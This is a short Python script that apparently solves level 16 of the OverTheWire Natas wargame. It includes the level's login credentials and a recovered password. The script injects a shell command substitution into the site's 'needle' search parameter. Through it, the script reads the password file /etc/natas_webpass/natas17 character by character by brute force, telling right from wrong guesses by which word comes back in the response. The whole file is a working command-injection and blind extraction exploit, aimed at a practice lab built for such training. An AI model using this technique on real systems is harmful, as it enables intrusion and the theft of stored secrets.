import requests
import string

credentials = ('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')
url = 'http://natas16.natas.labs.overthewire.org'
alphabet = string.ascii_letters + string.digits


template = '''$( if [  $(head -c {} /etc/natas_webpass/natas17) = {} ]
then
printf April
else printf Xmas
fi)'''

flag = ''   # 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
running = True
while running:
    found = False
    for c in alphabet:
        r = requests.get(url, params={'needle': template.format(len(flag + c), flag + c)}, auth=credentials)

        print(flag + c)
        print(r.request.path_url)
        if 'April' in r.text:
            flag += c
            found = True
            break

    if found == False:
        running = False

print('Done')
print('Password:', flag)



